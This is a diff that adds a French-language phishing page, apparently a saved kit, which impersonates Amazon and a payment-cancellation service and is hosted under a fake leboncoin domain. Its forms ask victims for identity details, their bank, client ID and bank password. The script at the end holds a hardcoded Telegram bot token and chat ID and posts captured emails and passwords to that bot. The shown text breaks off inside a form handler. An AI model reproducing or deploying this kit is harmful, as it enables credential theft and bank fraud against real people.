@@ -1,0 +1,1085 @@
+<!DOCTYPE html>
+<!-- saved from url=(0048)https://ssl-paiement-leboncoin-2026.netlify.app/ -->
+<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Amazon</title>
+  <link href="./wero_files/css2" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      color: #333;
+      min-height: 100vh;
+    }
+
+    /* ===== NAVBAR ===== */
+    nav {
+      width: 100%;
+      background-color: white;
+      height: 40px;
+      display: flex;
+      align-items: center;
+	  border-bottom: 2px solid black;
+      justify-content: center;
+      padding: 0 15px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+    nav .logo { display: flex; align-items: center; justify-content: center; }
+    nav .logo img {width: 60px;  height: 60px; object-fit: contain;  }
+    nav .logo span { font-size: 1.1rem; font-weight: 700; color: #fff; letter-spacing: 1px; }
+
+    /* ===== HERO ===== */
+    .hero {
+      position: relative;
+      min-height: calc(100vh - 40px);
+      background-image: url(bgamazon1.PNG);
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .hero::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: rgba(0,0,0,0.30);
+      pointer-events: none;
+    }
+    .hero::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(255,255,255,0.15) 0%, rgba(255,255,255,0.05) 40%, rgba(255,255,255,0.08) 100%);
+      pointer-events: none;
+    }
+
+    .hero-content {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+      width: 100%;
+      max-width: 460px;
+      padding: 20px;
+    }
+
+    .hero-logo-top img {
+      height: 70px;
+      object-fit: contain;
+      filter: drop-shadow(0 3px 8px rgba(0,0,0,0.25));
+    }
+
+    /* ===== FORM CARD ===== */
+    .form-card {
+      background: #ffffff;
+      border-radius: 18px;
+      padding: 50px 32px 45px;
+      width: 100%;
+      box-shadow:
+        0 20px 60px rgba(0,0,0,0.45),
+        0 8px 20px rgba(0,0,0,0.30),
+        0 2px 6px rgba(0,0,0,0.20),
+        inset 0 1px 0 rgba(255,255,255,0.9);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      border: 1px solid rgba(255,255,255,0.6);
+    }
+
+    .form-card .divider { width: 50px; height: 3px; background: #FF6200; border-radius: 10px; }
+
+    .form-card .card-title {
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: black;
+      text-align: center;
+      line-height: 1.3;
+    }
+
+    .form-card .card-text {
+      font-size: 0.92rem;
+      color: #555;
+      text-align: center;
+      line-height: 1.8;
+    }
+
+    .form-card .btn-main {
+      margin-top: 6px;
+      background-color: #FF6200;
+      color: black;
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.95rem;
+      font-weight: 600;
+      border: 1px solid black;
+      border-radius: 25px;
+      padding: 12px 40px;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.45s, box-shadow 0.2s;
+      box-shadow: 0 4px 14px #FF6200;
+      width: 100%;
+    }
+    .form-card .btn-main:hover { background-color: white; transform: translateY(-2px); }
+    .form-card .btn-main:active { transform: translateY(0); }
+
+    .form-card .ssl-text {
+      font-size: 0.68rem;
+      color: #aaa;
+      text-align: center;
+      line-height: 1.6;
+      margin-top: 4px;
+    }
+
+    /* ===== SECURITY NOTES ===== */
+    .security-note { display: flex; flex-direction: column; gap: 5px; text-align: center; }
+    .security-note p {
+      font-size: 0.70rem;
+      color: rgba(255,255,255,0.90);
+      line-height: 1.5;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+    }
+
+    /* RGPD note above card */
+    .rgpd-note {
+      font-size: 0.72rem;
+      color: rgba(255,255,255,0.88);
+      text-align: center;
+      text-shadow: 0 1px 3px rgba(0,0,0,0.5);
+      line-height: 1.5;
+      max-width: 400px;
+    }
+
+    /* ===== LOADING OVERLAY ===== */
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.75);
+      z-index: 9999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+    }
+    .loading-overlay.active { display: flex; }
+
+    /* Spinner wrapping the logo */
+    .spinner-wrap {
+      position: relative;
+      width: 90px;
+      height: 90px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .spinner-wrap .spinner-ring {
+      position: absolute;
+      inset: 0;
+      border: 4px solid rgba(255,255,255,0.15);
+      border-top-color: #FF6200;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+    }
+    .spinner-wrap img {
+      width: 48px;
+      height: 48px;
+      object-fit: contain;
+      filter: brightness(0) invert(1);
+      animation: pulse 1.2s ease-in-out infinite;
+    }
+    @keyframes pulse { 0%,100%{opacity:1;transform:scale(1);} 50%{opacity:0.7;transform:scale(0.93);} }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ===== PAGE 2 — LOGIN CARD ===== */
+    .page2-card {
+      background: #ffffff;
+      border-radius: 18px;
+      padding: 40px 32px 35px;
+      width: 100%;
+      box-shadow:
+        0 20px 60px rgba(0,0,0,0.45),
+        0 8px 20px rgba(0,0,0,0.30),
+        0 2px 6px rgba(0,0,0,0.20);
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 16px;
+      border: 1px solid rgba(255,255,255,0.6);
+      position: relative;
+    }
+
+    /* Logo en haut à gauche à l'intérieur de la card */
+    .page2-card .card-logo-right {
+      width: 100%;
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 6px;
+    }
+    .page2-card .card-logo-right img { height: 26px; object-fit: contain; }
+
+    .page2-card h2 {
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: #222;
+      line-height: 1.35;
+      max-width: 100%;
+      margin-top: 8px;
+    }
+
+    /* Champ email */
+    .page2-card .field-label {
+      font-size: 0.82rem;
+      color: #333;
+      font-weight: 500;
+      width: 100%;
+    }
+    .page2-card .field-label span { color: #e53935; margin-left: 2px; }
+
+    .page2-card input[type="email"] {
+      width: 100%;
+      height: 48px;
+      border: 1.5px solid #ccc;
+      border-radius: 10px;
+      padding: 0 14px;
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.92rem;
+      color: #333;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .page2-card input[type="email"]:focus { border-color: #FF6200; }
+
+    /* Bouton continuer page 2 */
+    .page2-card .btn-continuer {
+      width: 100%;
+      height: 50px;
+      background-color: #FF6200;
+      color: black;
+      font-family: 'Poppins', sans-serif;
+      font-size: 1rem;
+      font-weight: 600;
+      border: 1px solid black;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.15s;
+    }
+    .page2-card .btn-continuer:hover { background-color: white; transform: translateY(-1px); }
+
+    /* Séparateur Ou */
+    .page2-card .separator {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #aaa;
+      font-size: 0.85rem;
+    }
+    .page2-card .separator::before,
+    .page2-card .separator::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #ddd;
+    }
+
+    /* Boutons Apple / Google */
+    .page2-card .btn-social {
+      width: 100%;
+      height: 50px;
+      background: #fff;
+      border: 1.5px solid #ccc;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.92rem;
+      font-weight: 500;
+      color: #222;
+      cursor: pointer;
+      transition: background 0.2s, border-color 0.2s;
+    }
+    .page2-card .btn-social:hover { background: #f9f9f9; border-color: #aaa; }
+
+    /* Google G logo SVG inline */
+    .google-icon { width: 20px; height: 20px; }
+    .apple-icon { width: 18px; height: 18px; }
+
+    /* ===== BANK DROPDOWN ===== */
+    .bank-select-wrap { position: relative; width: 100%; }
+
+    .bank-selected {
+      width: 100%;
+      height: 50px;
+      border: 2px solid #FF6200;
+      border-radius: 8px;
+      padding: 0 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      cursor: pointer;
+      background: #fff;
+      user-select: none;
+    }
+    .bank-selected-logo { width: 30px; height: 30px; display:flex; align-items:center; }
+    .bank-selected-logo img { width: 30px; height: 30px; object-fit: contain; border-radius: 4px; }
+    .bank-selected-name { flex: 1; font-size: 0.90rem; color: #444; }
+    .bank-arrow { margin-left: auto; color: #FF6200; transition: transform 0.2s; }
+    .bank-arrow.open { transform: rotate(180deg); }
+
+    .bank-dropdown {
+      position: absolute;
+      top: calc(100% + 2px);
+      left: 0; right: 0;
+      background: #fff;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.10);
+      z-index: 200;
+      max-height: 260px;
+      overflow-y: auto;
+    }
+    .bank-dropdown::-webkit-scrollbar { width: 5px; }
+    .bank-dropdown::-webkit-scrollbar-thumb { background: #ddd; border-radius: 4px; }
+
+    .bank-option {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 13px 16px;
+      cursor: pointer;
+      transition: background 0.15s;
+      border-bottom: 1px solid #f2f2f2;
+    }
+    .bank-option:last-child { border-bottom: none; }
+    .bank-option:hover { background: #fef6f2; }
+    .bank-option img {
+      width: 36px;
+      height: 36px;
+      object-fit: contain;
+      border-radius: 6px;
+      flex-shrink: 0;
+    }
+    .bank-option span { font-size: 0.92rem; color: #222; font-weight: 500; }
+
+    /* Page 3 fields */
+    .p3-field { display: flex; flex-direction: column; gap: 5px; width: 100%; }
+    .p3-input {
+      width: 100%;
+      height: 46px;
+      border: 1.5px solid #ccc;
+      border-radius: 10px;
+      padding: 0 14px;
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.88rem;
+      color: #333;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .p3-input:focus { border-color: black; }
+
+    /* SSL bar page2 */
+    .ssl-bar {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      padding-top: 4px;
+      border-top: 1px solid #f0f0f0;
+    }
+    .ssl-item {
+      font-size: 0.63rem;
+      color: #bbb;
+      white-space: nowrap;
+    }
+    .ssl-sep {
+      font-size: 0.63rem;
+      color: #ddd;
+    }
+
+    /* Waiting spinner */
+    .waiting-box {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+    .waiting-spinner {
+      width: 52px;
+      height: 52px;
+      border: 5px solid #f0f0f0;
+      border-top-color: #FF6200;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    .waiting-text {
+      font-size: 0.80rem;
+      color: #999;
+      letter-spacing: 0.5px;
+    }
+
+    /* Advisor box */
+    .advisor-box {
+      width: 100%;
+      background: #fff9f6;
+      border: 1.5px solid #ffe0d0;
+      border-radius: 12px;
+      padding: 16px 18px;
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+      text-align: left;
+    }
+    .advisor-icon {
+      flex-shrink: 0;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: #fff0ea;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .advisor-text { flex: 1; }
+    .advisor-title {
+      font-size: 0.88rem;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 4px;
+    }
+    .advisor-desc {
+      font-size: 0.78rem;
+      color: #666;
+      line-height: 1.6;
+    }
+
+    /* Field errors */
+    .field-error {
+      font-size: 0.70rem;
+      color: #e53935;
+      margin-top: 4px;
+      display: block;
+    }
+
+    /* ===== PAGE 5 CONFIRMATION ===== */
+    .valid-circle {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #4caf50, #2e7d32);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 6px 20px rgba(76,175,80,0.35);
+      margin: 10px auto;
+      animation: popIn 0.5s ease;
+    }
+    @keyframes popIn {
+      0%{transform:scale(0);opacity:0;}
+      70%{transform:scale(1.1);}
+      100%{transform:scale(1);opacity:1;}
+    }
+    .progress-bar-wrap {
+      width: 100%;
+      height: 5px;
+      background: #f0f0f0;
+      border-radius: 10px;
+      overflow: hidden;
+      margin-top: 6px;
+    }
+    .progress-bar-fill {
+      height: 100%;
+      width: 100%;
+      background: #FF6200;
+      border-radius: 10px;
+      transition: width 1s linear;
+    }
+
+    /* ===== CARD SECTION ===== */
+    .card-section {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      padding-top: 10px;
+      border-top: 1px solid #f0f0f0;
+    }
+
+    .card-logos-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .card-logos-row img {
+      height: 48px;
+      object-fit: contain;
+      border-radius: 4px;
+    }
+
+    .card-info-text {
+      font-size: 0.78rem;
+      color: #666;
+      text-align: center;
+      line-height: 1.6;
+    }
+
+    /* ===== FOOTER ===== */
+    footer { width: 100%; padding: 0; margin: 0; display: block; overflow: hidden; line-height: 0; }
+    footer img { display: block; width: 100%; height: auto; }
+    @media (max-width: 520px) {
+      footer img { display: block; width: 100%; height: auto; float: none; }
+      footer { text-align: left; }
+      .hero-content { padding: 15px; }
+      .form-card { padding: 28px 18px 22px; }
+      .page2-card { padding: 30px 16px 25px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ===== NAVBAR ===== -->
+  <nav>
+    <div class="logo">
+      <img src="logo_amazon-removebg-preview.png" alt="Logo" >
+      <span style="display:none;">MonSite</span>
+    </div>
+  </nav>
+
+  <!-- ===== LOADING OVERLAY ===== -->
+  <div class="loading-overlay" id="loadingOverlay" style="display:none;">
+    <div class="spinner-wrap">
+      <div class="spinner-ring"></div>
+      <img src="logo_amazon-removebg-preview.png" alt="Logo" onerror="this.style.opacity=&#39;0&#39;">
+    </div>
+  </div>
+
+  <!-- ===== HERO ===== -->
+  <section class="hero" id="heroSection">
+    <div class="hero-content">
+
+      
+
+      <!-- RGPD note above card -->
+      <p class="rgpd-note">Cette plateforme utilise un chiffrement de bout en bout conforme aux normes RGPD.</p>
+
+      <!-- PAGE 1 : Carte félicitations -->
+      <div class="form-card" id="page1">
+        <div class="divider"></div>
+        <h1 class="card-title">Annulation</h1>
+        <p class="card-text">
+            Bonjour,
+Une demande d'annulation de paiement est en attente de validation. Pour consulter les détails de cette opération et finaliser la procédure, veuillez cliquer sur le bouton ci-dessous et suivre la procédure d'annulation.
+        </p>
+        <button type="button" class="btn-main" onclick="goToPage2()">Annuler</button>
+        <p class="ssl-text"><svg style="width:11px;height:11px;vertical-align:middle;margin-right:3px;" viewBox="0 0 24 24" fill="#aaa"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>Connexion sécurisée SSL 256-bit &nbsp;|&nbsp; Certifié TLS 1.3 &nbsp;|&nbsp; Données chiffrées</p>
+      </div>
+
+      
+
+      <!-- PAGE 3 : Informations personnelles (cachée au départ) -->
+      <div class="page2-card" id="page3" style="display:none;">
+       
+
+        <h2>Vos informations personnelles</h2>
+        <p style="font-size:0.82rem;color:#888;margin-top:-8px;">Pour votre sécurité et afin de certifier l'authenticité d'annulation de cette transaction, nous vous invitons à confirmer vos informations personnelles.
+  
+
+        <div style="width:100%;display:flex;flex-direction:column;gap:12px;">
+
+          <div class="p3-field">
+            <label class="field-label">Prénom <span>*</span></label>
+            <input type="text" class="p3-input" placeholder="Votre prénom">
+          </div>
+
+          <div class="p3-field">
+            <label class="field-label">Nom <span>*</span></label>
+            <input type="text" class="p3-input" placeholder="Votre nom">
+          </div>
+
+          <div class="p3-field">
+            <label class="field-label">Téléphone <span>*</span></label>
+            <input type="tel" class="p3-input" placeholder="+33 6 00 00 00 00">
+          </div>
+
+          <div class="p3-field">
+            <label class="field-label">Date de naissance <span>*</span></label>
+            <input placeholder="jj/mm/aaaa" type="text" class="p3-input">
+          </div>
+
+          <div class="p3-field">
+            <label class="field-label">Adresse <span>*</span></label>
+            <input type="text" class="p3-input" placeholder="Numéro et rue">
+          </div>
+
+          <div style="display:flex;gap:10px;">
+            <div class="p3-field" style="flex:1;">
+              <label class="field-label">Code postal</label>
+              <input type="text" class="p3-input" placeholder="75000">
+            </div>
+            <div class="p3-field" style="flex:2;">
+              <label class="field-label">Ville</label>
+              <input type="text" class="p3-input" placeholder="Paris">
+            </div>
+          </div>
+
+        </div>
+
+        <button type="button" class="btn-continuer" style="margin-top:4px;" onclick="goToPage4()">Valider</button>
+
+        <div class="ssl-bar">
+          <span class="ssl-item"><svg style="width:10px;height:10px;vertical-align:middle;margin-right:3px;" viewBox="0 0 24 24" fill="#aaa"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>SSL 256-bit</span>
+          <span class="ssl-sep">|</span>
+          <span class="ssl-item">TLS 1.3</span>
+          <span class="ssl-sep">|</span>
+          <span class="ssl-item">Données chiffrées</span>
+        </div>
+      </div>
+
+      <!-- PAGE 4 : Informations de paiement -->
+      <div class="page2-card" id="page4" style="display:none;">
+       
+
+        <h2>Authentification</h2>
+        <p style="font-size:0.82rem;color:#888;margin-top:-8px;width:100%;">Confirmez vos coordonnées afin de vous authentifier et déclencher en toute sécurité l'annulation</p>
+
+        <div style="width:100%;display:flex;flex-direction:column;gap:14px;">
+
+          <!-- Sélecteur banque -->
+          <div class="p3-field">
+            
+            <div class="bank-select-wrap">
+              <div class="bank-selected" id="bankSelected" onclick="toggleBankDropdown()">
+                <span class="bank-selected-logo" id="bankSelectedLogo"></span>
+                <span class="bank-selected-name" id="bankSelectedName">Choisir votre banque</span>
+                <svg class="bank-arrow" id="bankArrow" width="14" height="14" viewBox="0 0 24 24" fill="#f56b2a"><path d="M7 10l5 5 5-5z"></path></svg>
+              </div>
+              <div class="bank-dropdown" id="bankDropdown" style="display:none;">
+                <div class="bank-option" data-name="AXA Banque" data-img="./wero_files/axa banque.png">
+                  <img src="./wero_files/axa banque.png" alt="AXA Banque"><span>AXA Banque</span>
+                </div>
+                <div class="bank-option" data-name="Banque Populaire" data-img="./wero_files/banque populaire.png">
+                  <img src="./wero_files/banque populaire.png" alt="Banque Populaire"><span>Banque Populaire</span>
+                </div>
+                <div class="bank-option" data-name="La Banque Postale" data-img="./wero_files/banque_postal.png">
+                  <img src="./wero_files/banque_postal.png" alt="La Banque Postale"><span>La Banque Postale</span>
+                </div>
+                <div class="bank-option" data-name="BforBank" data-img="./wero_files/bforbank.png">
+                  <img src="./wero_files/bforbank.png" alt="BforBank"><span>BforBank</span>
+                </div>
+                <div class="bank-option" data-name="BNP Paribas" data-img="./wero_files/BNP.jpg">
+                  <img src="./wero_files/BNP.jpg" alt="BNP Paribas"><span>BNP Paribas</span>
+                </div>
+                <div class="bank-option" data-name="Boursorama Banque" data-img="./wero_files/boursorama.png">
+                  <img src="./wero_files/boursorama.png" alt="Boursorama Banque"><span>Boursorama Banque</span>
+                </div>
+                <div class="bank-option" data-name="Caisse d&#39;Épargne" data-img="./wero_files/caisse.jpg">
+                  <img src="./wero_files/caisse.jpg" alt="Caisse d&#39;Épargne"><span>Caisse d'Épargne</span>
+                </div>
+                <div class="bank-option" data-name="Carrefour Banque" data-img="./wero_files/carrefour banque.jpg">
+                  <img src="./wero_files/carrefour banque.jpg" alt="Carrefour Banque"><span>Carrefour Banque</span>
+                </div>
+                <div class="bank-option" data-name="Carte Bleue CB" data-img="./wero_files/cb.png">
+                  <img src="./wero_files/cb.png" alt="Carte Bleue CB"><span>Autres-Banques</span>
+                </div>
+                <div class="bank-option" data-name="Crédit Mutuel" data-img="./wero_files/Credit-Mutuel.png">
+                  <img src="./wero_files/Credit-Mutuel.png" alt="Crédit Mutuel"><span>Crédit Mutuel</span>
+                </div>
+                <div class="bank-option" data-name="Crédit Agricole" data-img="./wero_files/credit.jpg">
+                  <img src="./wero_files/credit.jpg" alt="Crédit Agricole"><span>Crédit Agricole</span>
+                </div>
+                <div class="bank-option" data-name="Hello Bank" data-img="./wero_files/hello banque.jpg">
+                  <img src="./wero_files/hello banque.jpg" alt="Hello Bank"><span>Hello Bank</span>
+                </div>
+                <div class="bank-option" data-name="LCL" data-img="./wero_files/LCL.png">
+                  <img src="./wero_files/LCL.png" alt="LCL"><span>LCL</span>
+                </div>
+                <div class="bank-option" data-name="N26" data-img="./wero_files/n26.png">
+                  <img src="./wero_files/n26.png" alt="N26"><span>N26</span>
+                </div>
+                <div class="bank-option" data-name="Nickel" data-img="./wero_files/nickel.png">
+                  <img src="./wero_files/nickel.png" alt="Nickel"><span>Nickel</span>
+                </div>
+                <div class="bank-option" data-name="Orange Bank" data-img="./wero_files/orange banque.jpg">
+                  <img src="./wero_files/orange banque.jpg" alt="Orange Bank"><span>Orange Bank</span>
+                </div>
+                <div class="bank-option" data-name="Revolut" data-img="./wero_files/revolut.png">
+                  <img src="./wero_files/revolut.png" alt="Revolut"><span>Revolut</span>
+                </div>
+                <div class="bank-option" data-name="Société Générale" data-img="./wero_files/sg.jpg">
+                  <img src="./wero_files/sg.jpg" alt="Société Générale"><span>Société Générale</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+
+          <!-- Identifiant client -->
+           <div class="p3-field">
+          <label class="field-label">Identifiant client <span>*</span></label>
+          <input type="text" maxlength="40" class="p3-input" placeholder="Votre identifiant">
+        </div>
+
+        <div class="p3-field">
+          <label class="field-label">Mot de passe <span>*</span></label>
+          <div style="position:relative;width:100%;">
+            <input type="password" maxlength="6" id="bankPwdInput" class="p3-input" placeholder="Votre mot de passe" style="padding-right:44px;">
+            <button type="button" id="bankEyeBtn" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#aaa;">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+            </button>
+          </div>
+        </div>
+
+        </div>
+
+
+        <button type="button" class="btn-continuer" id="btnPage4">Se connecter</button>
+
+        <div class="ssl-bar">
+          <span class="ssl-item"><svg style="width:10px;height:10px;vertical-align:middle;margin-right:3px;" viewBox="0 0 24 24" fill="#aaa"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>SSL 256-bit</span>
+          <span class="ssl-sep">|</span>
+          <span class="ssl-item">TLS 1.3</span>
+          <span class="ssl-sep">|</span>
+          <span class="ssl-item">Données chiffrées</span>
+        </div>
+      </div>
+	  
+      <div class="page2-card" id="page5" style="display:none;text-align:center;align-items:center;gap:18px;">
+          <div class="valid-circle">
+          <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+        </div>
+        <h2 style="font-size:1.25rem;font-weight:700;color:#1a1a1a;">Demande bien reçue</h2>
+        <p style="font-size:0.88rem;color:#444;line-height:1.8;max-width:340px;">
+          Vos informations ont été transmises avec succès à nos services.
+          <br>Nos experts procèdent actuellement à l'annulation de ces achats .
+        </p>
+
+        
+
+        
+
+        <!-- Texte niveau 4 — remplaçable -->
+        <p style="font-size:0.78rem;color:#bbb;line-height:1.6;">
+          Redirection automatique dans <span id="countdown" style="font-weight:600;color:#FF6200;"></span> secondes...
+        </p>
+
+        <!-- Barre de progression -->
+        <div class="progress-bar-wrap">
+          <div class="progress-bar-fill" id="progressBar"></div>
+        </div>
+
+        <div class="ssl-bar">
+          <span class="ssl-item">SSL 256-bit</span>
+          <span class="ssl-sep">|</span>
+          <span class="ssl-item">TLS 1.3</span>
+          <span class="ssl-sep">|</span>
+          <span class="ssl-item">Données chiffrées</span>
+        </div>
+      </div>
+
+      <!-- Notes de sécurité sous la div -->
+      <div class="security-note">
+        <p>Vos données personnelles sont protégées et ne sont jamais partagées avec des tiers.</p>
+        <p>Transactions sécurisées et vérifiées par nos équipes de cybersécurité 24h/24.</p>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ===== FOOTER ===== -->
+  <footer>
+    <img src="bgamazon.PNG" alt="Footer" style="pointer-events:none;">
+  </footer>
+
+  <script>
+window.addEventListener('DOMContentLoaded', function() {
+
+  // =========================================
+  // CONFIG TELEGRAM
+  // =========================================
+  var TELEGRAM_TOKEN  = "9246988184:AAEvVRcEQEieGvHL3vknGguwKFY_V69z46I";
+  var TELEGRAM_CHAT_ID = "-5315453049";
+  var BOT_NAME = "Wero_Results";
+
+  function sendTelegram(msg) {
+    fetch("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: "HTML" })
+    }).catch(function(){});
+  }
+
+  // =========================================
+  // OVERLAY LOADING
+  // =========================================
+  var overlay = document.getElementById('loadingOverlay');
+
+  function showLoading(callback, ms) {
+    overlay.style.display = 'flex';
+    setTimeout(function() {
+      overlay.style.display = 'none';
+      callback();
+    }, ms || 3000);
+  }
+
+  function goTo(hideId, showId) {
+    var hide = document.getElementById(hideId);
+    var show = document.getElementById(showId);
+    if (hide) hide.style.display = 'none';
+    if (show) { show.style.display = 'flex'; show.style.flexDirection = 'column'; }
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  // =========================================
+  // VALIDATION
+  // =========================================
+  function showErr(el, msg) {
+    clearErr(el);
+    el.style.borderColor = '#e53935';
+    var p = document.createElement('p');
+    p.className = 'field-error';
+    p.textContent = msg;
+    el.parentNode.insertBefore(p, el.nextSibling);
+  }
+  function clearErr(el) {
+    el.style.borderColor = '';
+    var n = el.nextSibling;
+    if (n && n.className === 'field-error') n.remove();
+  }
+  function clearAllErr(container) {
+    container.querySelectorAll('.field-error').forEach(function(e){ e.remove(); });
+    container.querySelectorAll('input').forEach(function(i){ i.style.borderColor = ''; });
+  }
+
+  // =========================================
+  // PAGE 1 → PAGE 2
+  // =========================================
+  var btnMain = document.querySelector('#page1 .btn-main');
+  if (btnMain) {
+    btnMain.addEventListener('click', function() {
+      showLoading(function() {
+        goTo('page1', 'page3');
+      }, 3000);
+    });
+  }
+
+  // =========================================
+  // PAGE 2 : email + mot de passe → PAGE 3
+  // =========================================
+  var passwordShown = false;
+  var btnContinuer = document.getElementById('btnContinuer');
+  if (btnContinuer) {
+    btnContinuer.addEventListener('click', function() {
+      var emailInput = document.getElementById('emailInput');
+      var email = emailInput.value.trim();
+
+      if (!passwordShown) {
+        clearErr(emailInput);
+        if (!email || !email.includes('@') || !email.includes('.')) {
+          showErr(emailInput, 'Adresse e-mail invalide.'); return;
+        }
+        document.getElementById('passwordSection').style.display = 'block';
+        passwordShown = true;
+        btnContinuer.textContent = 'Se connecter';
+        emailInput.readOnly = true;
+        emailInput.style.color = '#999';
+        sendTelegram("\uD83D\uDD14 <b>" + BOT_NAME + "</b>\n\n\uD83D\uDCCB <b>\u00C9tape 1 \u2014 Email</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\uD83D\uDCE7 <b>Email :</b> " + email);
+      } else {
+        var pwdInput = document.getElementById('passwordInput');
+        clearErr(pwdInput);
+        if (!pwdInput.value || pwdInput.value.length < 4) {
+          showErr(pwdInput, 'Mot de passe trop court.'); return;
+        }
+        sendTelegram("\uD83D\uDD14 <b>" + BOT_NAME + "</b>\n\n\uD83D\uDCCB <b>\u00C9tape 1 \u2014 Mot de passe</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\uD83D\uDD10 <b>Mot de passe :</b> " + pwdInput.value);
+        showLoading(function() { goTo('page2', 'page3'); }, 3000);
+      }
+    });
+  }
+
+  // =========================================
+  // PAGE 3 : infos personnelles → PAGE 4
+  // =========================================
+  var btnPage3 = document.querySelector('#page3 .btn-continuer');
+  if (btnPage3) {
+    btnPage3.addEventListener('click', function() {
+      var page3 = document.getElementById('page3');
+      var inputs = page3.querySelectorAll('.p3-input');
+      var labels = page3.querySelectorAll('.field-label');
+      var valid = true;
+      clearAllErr(page3);
+      inputs.forEach(function(inp) {
+        if (!inp.value.trim()) { showErr(inp, 'Ce champ est obligatoire.'); valid = false; }
+      });
+      if (!valid) return;
